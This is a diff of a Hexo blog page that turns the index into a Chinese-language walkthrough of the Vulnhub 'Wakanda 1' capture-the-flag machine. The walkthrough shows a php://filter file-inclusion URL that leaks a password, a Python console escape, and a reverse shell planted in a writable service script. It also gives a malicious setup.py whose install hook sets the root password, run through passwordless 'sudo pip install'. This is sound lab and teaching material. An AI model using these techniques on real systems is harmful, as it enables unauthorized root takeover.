@@ -6,15 +6,33 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>owefsad&#39;s blog</title>
+  <title>Vulnhub Wakanda 1 | owefsad&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="owefsad&#39;s blog">
-<meta property="og:url" content="http://yoursite.com/index.html">
+  <meta name="description" content="思路 端口扫描, 整理思路 80端口, 文件包含 3333端口, 逃逸python devops, 服务提权 sudo -l, 成功通关">
+<meta name="keywords" content="文件包含,pip提权,服务提权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnhub Wakanda 1">
+<meta property="og:url" content="http://yoursite.com/2018/12/07/Vulnhub-Wakanda/index.html">
 <meta property="og:site_name" content="owefsad&#39;s blog">
+<meta property="og:description" content="思路 端口扫描, 整理思路 80端口, 文件包含 3333端口, 逃逸python devops, 服务提权 sudo -l, 成功通关">
 <meta property="og:locale" content="default">
+<meta property="og:image" content="http://i1.bvimg.com/671004/50a96bc53eca1783.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/e0e9777d1f7ede98.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/22789e3a40f897dc.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/142f9b19f9dcb91d.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/f616b14939d0ca2a.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/2c40115b56e17beb.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/4c57c441672cae83.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/a2d69fa45fb30dd2.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/3b0b2334caeeba2c.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/6b2aa3371514a94f.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/99e999d454233621.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/89f564467097bfca.png">
+<meta property="og:updated_time" content="2018-12-08T02:30:13.417Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="owefsad&#39;s blog">
+<meta name="twitter:title" content="Vulnhub Wakanda 1">
+<meta name="twitter:description" content="思路 端口扫描, 整理思路 80端口, 文件包含 3333端口, 逃逸python devops, 服务提权 sudo -l, 成功通关">
+<meta name="twitter:image" content="http://i1.bvimg.com/671004/50a96bc53eca1783.png">
   
     <link rel="alternative" href="/atom.xml" title="owefsad&#39;s blog" type="application/atom+xml">
   
@@ -164,210 +182,14 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-hexo-install" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
+            <article id="post-Vulnhub-Wakanda" class="article article-type-post " itemscope="" itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/12/08/hexo-install/">Hexo搭建个人博客</a>
-    </h1>
-  
-
-        
-        <a href="/2018/12/08/hexo-install/" class="archive-article-date">
-  	<time datetime="2018-12-08T02:30:13.419Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-08</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Hexo安装与配置"><a href="#Hexo安装与配置" class="headerlink" title="Hexo安装与配置"></a>Hexo安装与配置</h2>
-        
-          <a class="article-more-a" href="/2018/12/08/hexo-install/#more">read all >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">hexo</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/hexo//" class="article-tag-list-link color5">hexo</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/12/08/hexo-install/">查看全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Vulnhub-Challenging-Raven" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/12/08/Vulnhub-Challenging-Raven/">Vulnhub Challenging: Raven</a>
-    </h1>
-  
-
-        
-        <a href="/2018/12/08/Vulnhub-Challenging-Raven/" class="archive-article-date">
-  	<time datetime="2018-12-08T02:30:13.393Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-08</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul>
-<li>拿到靶机，端口扫描</li>
-<li>80端口，查找WEB漏洞</li>
-<li>wordpress框架，枚举、爆破、搜cve</li>
-<li>22端口，ssh爆破</li>
-<li>mysql服务，爆破、拖库、UDF提权</li>
-<li>拿到hash，john爆破</li>
-<li>sudo -l，root执行后逃逸提权
-        
-          <a class="article-more-a" href="/2018/12/08/Vulnhub-Challenging-Raven/#more">read all >></a>
-        
-      
-
-      
-    </li></ul></div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">wordpress爆破</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">ssh爆破</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">udf提权</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">sudoers配置错误</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/ctf//" class="article-tag-list-link color4">ctf</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/12/08/Vulnhub-Challenging-Raven/">查看全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Vulnhub-Wakanda" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/12/07/Vulnhub-Wakanda/">Vulnhub Wakanda 1</a>
+    <h1 class="article-title" itemprop="name">
+      Vulnhub Wakanda 1
     </h1>
   
 
@@ -385,14 +207,69 @@
 <li>80端口, 文件包含</li>
 <li>3333端口, 逃逸python</li>
 <li>devops, 服务提权</li>
-<li>sudo -l, 成功通关
-        
-          <a class="article-more-a" href="/2018/12/07/Vulnhub-Wakanda/#more">read all >></a>
-        
+<li>sudo -l, 成功通关<a id="more"></a>
+</li>
+</ul>
+<h3 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h3><ul>
+<li>文件包含, php://filter读php代码</li>
+<li>自定义服务, 自动重启</li>
+<li>sudo无密码执行pip, pip提权</li>
+</ul>
+<h4 id="端口扫描-整理思路"><a href="#端口扫描-整理思路" class="headerlink" title="端口扫描, 整理思路"></a>端口扫描, 整理思路</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -sS -Pn -A -p- 10.129.10.36</span><br></pre></td></tr></table></figure>
+<p><img src="http://i1.bvimg.com/671004/50a96bc53eca1783.png" alt="Markdown"><br>80端口, Apache httpd 2.4.10 无漏洞可用、考虑WEB漏洞<br>111端口, rpcbind和status无法利用 放弃<br>3333端口, ssh服务 搁置<br>53784端口, 放弃</p>
+<h4 id="80端口-文件包含"><a href="#80端口-文件包含" class="headerlink" title="80端口, 文件包含"></a>80端口, 文件包含</h4><p>查看WEB页面源码后发现一个隐藏的url, 访问之后页面内容发生改变;<br><img src="http://i1.bvimg.com/671004/e0e9777d1f7ede98.png" alt="Markdown"></p>
+<p>猜测此处可能的实现方法是: Sql、文件包含、文件读取、内部判断输出</p>
+<ol>
+<li>尝试sql, 丢地址到sqlmap后无果 搁置</li>
+<li>尝试文件包含, wfuzz加字典FUZZ 发现index导致响应不同</li>
+<li>尝试文件读取, BurpSuite加字典FUZZ无果 搁置</li>
+</ol>
+<p>访问：<code>http://10.129.10.36/?lang=php://filter/read=convert.base64-encode/resource=index</code>, 读出bash64编码的数据； 数据丢到BurpSuite解码, 拿到密码<br><img src="http://i1.bvimg.com/671004/22789e3a40f897dc.png" alt="Markdown"></p>
+<h4 id="3333端口-逃逸python"><a href="#3333端口-逃逸python" class="headerlink" title="3333端口, 逃逸python"></a>3333端口, 逃逸python</h4><p>拿到密码后, 在html源码中找到meta字段元标签, 尝试用author的值mamadou作为用户名登陆ssh, 成功登陆<br><img src="http://i1.bvimg.com/671004/142f9b19f9dcb91d.png" alt="Markdown"></p>
+<p>拿到python控制台后, 运行操作系统命令bash, 逃逸python控制台<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.system(<span class="string">"bash"</span>)</span><br></pre></td></tr></table></figure></p>
+<p>进入mamadou主目录, 发现flag1<br><img src="http://i1.bvimg.com/671004/f616b14939d0ca2a.png" alt="Markdown"></p>
+<h4 id="devops-服务提权"><a href="#devops-服务提权" class="headerlink" title="devops, 服务提权"></a>devops, 服务提权</h4><p>拿到bash后, 执行LinEnum.sh查找可利用点, 结果一无所获. 此时的思路是查找其他用户属主的文件, 找出其中当前用户可写的文件, 然后分析是否有利用的可能</p>
+<p>小提示：当前账号无法查找到可利用的点时, 考虑查找其他账户属主的文件, 重点关注当前权限可写文件, 查找是否有计划任务、服务等利用该文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ find / -user devops 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://i1.bvimg.com/671004/2c40115b56e17beb.png" alt="Markdown"></p>
+<p>发现文件<code>/srv/.antivirus.py</code>且当前用户可写, 查找当前文件是否被服务调用(根据LinEnum.sh的执行结果, 已排除计划任务的可能性)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ grep -ri <span class="string">".antivirus.py"</span> / 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://i1.bvimg.com/671004/4c57c441672cae83.png" alt="Markdown"></p>
+<p>发现有服务在运行此文件, 查看服务内容<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat /lib/systemd/system/antivirus.service</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://i1.bvimg.com/671004/a2d69fa45fb30dd2.png" alt="Markdown"></p>
+<p>服务具有自动重启功能, 于是在文件中写入python反弹shell, 拿到devops权限的shell, 获得flag2<br><img src="http://i1.bvimg.com/671004/3b0b2334caeeba2c.png" alt="Markdown"></p>
+<h4 id="sudo-l-成功通关"><a href="#sudo-l-成功通关" class="headerlink" title="sudo -l, 成功通关"></a><code>sudo -l</code>, 成功通关</h4><p>运行LinEnum.sh文件, 查找devops用户中可利用的点, 发现可通过sudo无密码运行pip程序<br><img src="http://i1.bvimg.com/671004/6b2aa3371514a94f.png" alt="Markdown"></p>
+<p>pip是python中用来安装模块的一款工具, python模块是可以自己构建的, 因此此处可通过自建python模块实现提权<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下面这段代码改编自:https://github.com/0x00-0x00/fakepip, 感谢大神的分享</span></span><br><span class="line"><span class="keyword">from</span> setuptools <span class="keyword">import</span> setup</span><br><span class="line"><span class="keyword">from</span> setuptools.command.install <span class="keyword">import</span> install</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CustomInstall</span><span class="params">(install)</span>:</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">    install.run(self)</span><br><span class="line">    os.system(<span class="string">'(echo "owefsad";sleep 1;echo "owefsad")|passwd&gt;/dev/null'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">setup(name=<span class="string">'SetRootPwd'</span>,</span><br><span class="line">      version=<span class="string">'0.0.1'</span>,</span><br><span class="line">      description=<span class="string">'This will exploit a sudoer able to /usr/bin/pip install *'</span>,</span><br><span class="line">      url=<span class="string">''</span>,</span><br><span class="line">      author=<span class="string">'owefsad'</span>,</span><br><span class="line">      author_email=<span class="string">'owefsad@gmail.com'</span>,</span><br><span class="line">      license=<span class="string">'MIT'</span>,</span><br><span class="line">      zip_safe=<span class="keyword">False</span>,</span><br><span class="line">      cmdclass=&#123;<span class="string">'install'</span>: CustomInstall&#125;)</span><br></pre></td></tr></table></figure></p>
+<p>将上面的文件命名为setup.py, 然后放在一个空白文件夹中, 进入文件夹安装SetRootPwd模块, 即可成功修改root密码为<code>owefsad</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> SetRootPwd</span><br><span class="line">$ sudo pip install .</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://i1.bvimg.com/671004/99e999d454233621.png" alt="Markdown"></p>
+<p>拿到root.txt中的flag<br><img src="http://i1.bvimg.com/671004/89f564467097bfca.png" alt="Markdown"></p>
+<h4 id="疑点"><a href="#疑点" class="headerlink" title="疑点"></a>疑点</h4><ol>
+<li>从mamadou提权到devops时, 需要利用antivirus服务, 服务必须出错或停止时, 才能能够重启, 然后执行反弹shell; 但是服务中原来的python代码是可以正常执行的, 为何在第一次写入反弹shell后, 可执行反弹sehll?</li>
+</ol>
+
       
 
       
-    </li></ul></div>
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
     <div class="article-info article-info-index">
       
       
@@ -429,16 +306,79 @@
 
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/12/07/Vulnhub-Wakanda/">查看全文 >></a>
-        </p>
-      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2018/12/07/Vulnhub-Wakanda/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2018/12/08/Vulnhub-Challenging-Raven/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          Vulnhub Challenging: Raven
+        
+      </div>
+    </a>
+  
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -458,8 +398,14 @@
 
 
 
+  
+  
+  
 
   
+
+  
+
   
 
 
@@ -482,8 +428,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
